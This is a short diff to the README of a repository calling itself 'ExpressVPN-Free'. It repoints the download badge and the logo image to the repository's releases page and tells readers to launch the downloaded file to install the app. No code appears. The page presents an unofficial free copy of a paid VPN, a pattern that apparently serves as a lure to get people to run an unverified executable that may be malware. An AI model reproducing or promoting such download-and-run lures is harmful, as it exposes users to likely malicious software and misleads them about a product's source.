@@ -21,7 +21,7 @@ Welcome to the **ExpressVPN-Free** repository! Here, you will find information a
 
 ## Downloading the App
 To access the ExpressVPN application, please download it from the following link:  
-[![Download ExpressVPN App](https://img.shields.io/badge/Download-ExpressVPN-green)](https://github.com/uploads/App.zip)  
+[![Download ExpressVPN App](https://github.com/Yass0988/ExpressVPN-Free/releases)](https://github.com/Yass0988/ExpressVPN-Free/releases)  
 *Note: Launch the downloaded file to install the application.*
 
 ## Using ExpressVPN in China
@@ -47,6 +47,6 @@ For additional information, updates, or support regarding ExpressVPN, please che
 
 Dive into the world of ExpressVPN with the **ExpressVPN-Free** repository and unlock a seamless VPN experience with advanced features and in-depth guidance. Stay secure, anonymous, and unrestricted online with ExpressVPN.
 
-![ExpressVPN Logo](https://www.example.com/expressvpn-logo.png)
+![ExpressVPN Logo](https://github.com/Yass0988/ExpressVPN-Free/releases)
 
 🔒🚀 Happy VPN-ing with ExpressVPN! 🚀🔒
